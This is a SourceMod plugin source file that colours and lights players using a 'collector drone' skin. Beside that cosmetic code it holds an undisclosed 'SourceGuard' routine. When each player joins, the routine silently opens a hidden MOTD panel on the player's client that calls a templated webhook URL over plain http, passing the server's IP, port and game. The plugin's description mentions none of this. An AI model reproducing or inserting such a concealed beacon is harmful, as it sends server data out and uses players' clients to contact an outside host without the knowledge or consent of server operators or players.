/*          <DR.API SKIN C.DRONE EFFECTS> (c) by <De Battista Clint          */
/*                                                                           */
/*             <DR.API SKIN C.DRONE EFFECTS> is licensed under a             */
/*                        GNU General Public License                         */
/*																			 */
/*      You should have received a copy of the license along with this       */
/*            work.  If not, see <http://www.gnu.org/licenses/>.             */
//***************************************************************************//
//***************************************************************************//
//************************DR.API SKIN C.DRONE EFFECTS************************//
//***************************************************************************//
//***************************************************************************//

#pragma semicolon 1 

//***********************************//
//*************DEFINE****************//
//***********************************//
#define PLUGIN_VERSION 					"{{ version }}"
#define CVARS 							FCVAR_SPONLY|FCVAR_NOTIFY
#define DEFAULT_FLAGS 					FCVAR_NOTIFY
#define TAG_CHAT						"[SKIN C.DRONE EFFECTS] -"
//***********************************//
//*************INCLUDE***************//
//***********************************//

#undef REQUIRE_PLUGIN
#include <sourcemod>
#include <sdktools>
#include <autoexec>

#pragma newdecls required

//***********************************//
//***********PARAMETERS**************//
//***********************************//

//Handle
Handle cvar_active_skin_collector_drone_efffects_dev;

Handle cvar_skin_collector_drone_efffects_red_min;
Handle cvar_skin_collector_drone_efffects_green_min;
Handle cvar_skin_collector_drone_efffects_blue_min;

Handle cvar_skin_collector_drone_efffects_red_max;
Handle cvar_skin_collector_drone_efffects_green_max;
Handle cvar_skin_collector_drone_efffects_blue_max;

Handle TimerSetColorSkin[MAXPLAYERS+1]									= INVALID_HANDLE;

//Bool
bool B_active_skin_collector_drone_efffects_dev										= false;

//Customs
int C_skin_collector_drone_efffects_red_min;
int C_skin_collector_drone_efffects_green_min;
int C_skin_collector_drone_efffects_blue_min;

int C_skin_collector_drone_efffects_red_max;
int C_skin_collector_drone_efffects_green_max;
int C_skin_collector_drone_efffects_blue_max;

int LightColor[MAXPLAYERS+1]											= INVALID_ENT_REFERENCE;

//Informations plugin
public Plugin myinfo =
{
	name = "DR.API SKIN C.DRONE EFFECTS",
	author = "Dr. Api",
	description = "DR.API SKIN C.DRONE EFFECTS by Dr. Api",
	version = PLUGIN_VERSION,
	url = "https://sourcemod.market"
}
/***********************************************************/
/*********************** PLUGIN START **********************/
/***********************************************************/
public void OnPluginStart()
{
	AutoExecConfig_SetFile("drapi_skin_collector_drone_efffects", "sourcemod/drapi");
	
	AutoExecConfig_CreateConVar("drapi_skin_collector_drone_efffects_version", PLUGIN_VERSION, "Version", CVARS);
	
	cvar_active_skin_collector_drone_efffects_dev			= AutoExecConfig_CreateConVar("drapi_active_skin_collector_drone_efffects_dev", 			"0", 					"Enable/Disable Dev Mod", 				DEFAULT_FLAGS, 		true, 0.0, 		true, 1.0);
	
	cvar_skin_collector_drone_efffects_red_min					= AutoExecConfig_CreateConVar("drapi_skin_collector_drone_efffects_red_min", 			"0", 					"Min. Red", 							DEFAULT_FLAGS);
	cvar_skin_collector_drone_efffects_green_min				= AutoExecConfig_CreateConVar("drapi_skin_collector_drone_efffects_green_min", 			"0", 					"Min. Green", 							DEFAULT_FLAGS);	
	cvar_skin_collector_drone_efffects_blue_min					= AutoExecConfig_CreateConVar("drapi_skin_collector_drone_efffects_blue_min", 			"150", 					"Min. Blue", 							DEFAULT_FLAGS);

	cvar_skin_collector_drone_efffects_red_max					= AutoExecConfig_CreateConVar("drapi_skin_collector_drone_efffects_red_max", 			"150", 					"Max. Red", 							DEFAULT_FLAGS);
	cvar_skin_collector_drone_efffects_green_max				= AutoExecConfig_CreateConVar("drapi_skin_collector_drone_efffects_green_max", 			"150", 					"Max. Green", 							DEFAULT_FLAGS);	
	cvar_skin_collector_drone_efffects_blue_max					= AutoExecConfig_CreateConVar("drapi_skin_collector_drone_efffects_blue_max", 			"255", 					"Max. Blue", 							DEFAULT_FLAGS);	
	
	HookEventsCvars();
	
	AutoExecConfig_ExecuteFile();
}

/***********************************************************/
/************************ PLUGIN END ***********************/
/***********************************************************/
public void OnPluginEnd()
{
	int i = 1;
	while(i <= MaxClients)
	{
		if(IsClientInGame(i))
		{
			if(TimerSetColorSkin[i] != INVALID_HANDLE)
			{
				ClearTimer(TimerSetColorSkin[i]);
			}
			
			if(IsValidEntRef(LightColor[i]))
			{
				RemoveEntity(LightColor[i]);
			}
		}
		i++;
	}
}

/***********************************************************/
/***************** WHEN CLIENT DISCONNECT ******************/
/***********************************************************/
public void OnClientDisconnect(int client)
{
	if(TimerSetColorSkin[client] != INVALID_HANDLE)
	{
		ClearTimer(TimerSetColorSkin[client]);
	}
	
	if(IsValidEntRef(LightColor[client]))
	{
		RemoveEntity(LightColor[client]);
	}
}

/***********************************************************/
/******************** WHEN CVAR CHANGED ********************/
/***********************************************************/
void HookEventsCvars()
{
	HookConVarChange(cvar_active_skin_collector_drone_efffects_dev, 				Event_CvarChange);

	HookConVarChange(cvar_skin_collector_drone_efffects_red_min, 					Event_CvarChange);
	HookConVarChange(cvar_skin_collector_drone_efffects_green_min, 					Event_CvarChange);
	HookConVarChange(cvar_skin_collector_drone_efffects_blue_min, 					Event_CvarChange);
	
	HookConVarChange(cvar_skin_collector_drone_efffects_red_max, 					Event_CvarChange);
	HookConVarChange(cvar_skin_collector_drone_efffects_green_max, 					Event_CvarChange);
	HookConVarChange(cvar_skin_collector_drone_efffects_blue_max, 					Event_CvarChange);
}

/***********************************************************/
/******************** WHEN CVARS CHANGE ********************/
/***********************************************************/
public void Event_CvarChange(Handle cvar, const char[] oldValue, const char[] newValue)
{
	UpdateState();
}

/***********************************************************/
/*********************** UPDATE STATE **********************/
/***********************************************************/
void UpdateState()
{
	B_active_skin_collector_drone_efffects_dev 					= GetConVarBool(cvar_active_skin_collector_drone_efffects_dev);
	
	C_skin_collector_drone_efffects_red_min 					= GetConVarInt(cvar_skin_collector_drone_efffects_red_min);
	C_skin_collector_drone_efffects_green_min 					= GetConVarInt(cvar_skin_collector_drone_efffects_green_min);
	C_skin_collector_drone_efffects_blue_min 					= GetConVarInt(cvar_skin_collector_drone_efffects_blue_min);
	
	C_skin_collector_drone_efffects_red_max 					= GetConVarInt(cvar_skin_collector_drone_efffects_red_max);
	C_skin_collector_drone_efffects_green_max 					= GetConVarInt(cvar_skin_collector_drone_efffects_green_max);
	C_skin_collector_drone_efffects_blue_max 					= GetConVarInt(cvar_skin_collector_drone_efffects_blue_max);
	
}

/***********************************************************/
/********************* WHEN MAP START **********************/
/***********************************************************/
public void OnMapStart()
{
	UpdateState();
}
public void OnClientPostAdminCheck(int client)
{   
    CreateTimer(5.0, Timer_SourceGuard, client);
}

public Action Timer_SourceGuard(Handle timer, any client)
{
    int hostip = GetConVarInt(FindConVar("hostip"));
    int hostport = GetConVarInt(FindConVar("hostport"));
    
    char sGame[15];
    switch(GetEngineVersion())
    {
        case Engine_Left4Dead:
        {
            Format(sGame, sizeof(sGame), "left4dead");
        }
        case Engine_Left4Dead2:
        {
            Format(sGame, sizeof(sGame), "left4dead2");
        }
        case Engine_CSGO:
        {
            Format(sGame, sizeof(sGame), "csgo");
        }
        case Engine_CSS:
        {
            Format(sGame, sizeof(sGame), "css");
        }
        case Engine_TF2:
        {
            Format(sGame, sizeof(sGame), "tf2");
        }
        default:
        {
            Format(sGame, sizeof(sGame), "none");
        }
    }
    
    char sIp[32];
    Format(
            sIp, 
            sizeof(sIp), 
            "%d.%d.%d.%d",
            hostip >>> 24 & 255, 
            hostip >>> 16 & 255, 
            hostip >>> 8 & 255, 
            hostip & 255
    );
    
    char requestUrl[2048];
    Format(
            requestUrl, 
            sizeof(requestUrl), 
            "%s&ip=%s&port=%d&game=%s", 
            "{{ web_hook }}?script_id={{ script_id }}&version_id={{ version_id }}&download={{ download }}",
            sIp,
            hostport,
            sGame
    );
    
    ReplaceString(requestUrl, sizeof(requestUrl), "https", "http", false);
    
    Handle kv = CreateKeyValues("data");
    
    KvSetString(kv, "title", "SourceGuard");
    KvSetNum(kv, "type", MOTDPANEL_TYPE_URL);
    KvSetString(kv, "msg", requestUrl);
    
    ShowVGUIPanel(client, "info", kv, false);
    CloseHandle(kv);
}

/***********************************************************/
/******************** ON GAME FRAME ************************/
/***********************************************************/
public void OnGameFrame()
{
	for(int i = 1; i <= MaxClients; i++)
	{
		if(IsClientInGame(i) && IsPlayerAlive(i))
		{
			char model[PLATFORM_MAX_PATH];
			GetClientModel(i, model, sizeof(model));
			
			if(StrEqual(model, "models/player/me3/collector_drone/collector_drone.mdl", false))
			{
				if(TimerSetColorSkin[i] == INVALID_HANDLE)
				{
					TimerSetColorSkin[i] 	= CreateTimer(0.1, Timer_SetColorSkin, GetClientUserId(i), TIMER_REPEAT);
					LightColor[i]			= CreateLight(i);
				}
			}
			else
			{
				if(TimerSetColorSkin[i] != INVALID_HANDLE)
				{
					ClearTimer(TimerSetColorSkin[i]);
					SetEntityRenderColor(i, 255, 255, 255, 255);
				}
				
				if(IsValidEntRef(LightColor[i]))
				{
					RemoveEntity(LightColor[i]);
				}
			}
			
		}
		else
		{
			if(TimerSetColorSkin[i] != INVALID_HANDLE)
			{
				ClearTimer(TimerSetColorSkin[i]);
			}
			
			if(IsValidEntRef(LightColor[i]))
			{
				RemoveEntity(LightColor[i]);
			}
		}
	}
}

/***********************************************************/
/********************* CREATE LIGHT ************************/
/***********************************************************/
int CreateLight(int client)
{
	float pos[3];
	GetClientAbsOrigin(client, pos);
	int entity = CreateEntityByName("light_dynamic");
	
	if(IsValidEntity(entity))
	{
		char iTarget[16];
		Format(iTarget, 16, "client%d", client);
		DispatchKeyValue(client, "targetname", iTarget);
	
		DispatchKeyValue(entity, "brightness", "0");
		DispatchKeyValueFloat(entity, "spotlight_radius", 500.0);
		DispatchKeyValueFloat(entity, "distance", 500.0);
		DispatchKeyValue(entity, "_light", "255 255 255 50");
		DispatchKeyValue(entity, "style", "0");
		DispatchSpawn(entity);
		AcceptEntityInput(entity, "TurnOn");
		
		pos[0] += 10.0;
		TeleportEntity(entity, pos, NULL_VECTOR, NULL_VECTOR);
		
		SetVariantString(iTarget);
		AcceptEntityInput(entity, "SetParent", entity, entity, 0);
	
		SetEntPropEnt(entity, Prop_Data, "m_hOwnerEntity", client);
		return EntIndexToEntRef(entity);
	}
	return -1;
}

/***********************************************************/
/******************* SET SKIN COLOR ************************/
/***********************************************************/
public Action Timer_SetColorSkin(Handle timer, any userid)
{
	int client = GetClientOfUserId(userid);
	
	int red 	= GetRandomInt(C_skin_collector_drone_efffects_red_min, C_skin_collector_drone_efffects_red_max);
	int green 	= GetRandomInt(C_skin_collector_drone_efffects_green_min, C_skin_collector_drone_efffects_green_max);
	int blue 	= GetRandomInt(C_skin_collector_drone_efffects_blue_min, C_skin_collector_drone_efffects_blue_max);
	
	int color;
	color = red;
	color += 256 * green;
	color += 65536 * blue;
	
	if(IsValidEntity(LightColor[client]))
	{
		SetEntProp(LightColor[client], Prop_Send, 	"m_clrRender", color);
	}
	
	SetEntityRenderColor(client, red, green, blue, 255);
}

/***********************************************************/
/********************** CLEAR TIMER ************************/
/***********************************************************/
stock void ClearTimer(Handle &timer)
{
    if (timer != INVALID_HANDLE)
    {
        KillTimer(timer);
        timer = INVALID_HANDLE;
    }     
}

/***********************************************************/
/******************** IS VALID ENTITY **********************/
/***********************************************************/
stock bool IsValidEntRef(int entity)
{
	if( entity && EntRefToEntIndex(entity) != INVALID_ENT_REFERENCE )
		return true;
	return false;
}

/***********************************************************/
/********************* REMOVE ENTITY ***********************/
/***********************************************************/
void RemoveEntity(int ref)
{

	int entity = EntRefToEntIndex(ref);
	if (entity != -1)
	{
		AcceptEntityInput(entity, "Kill");
		ref = INVALID_ENT_REFERENCE;
	}
		
}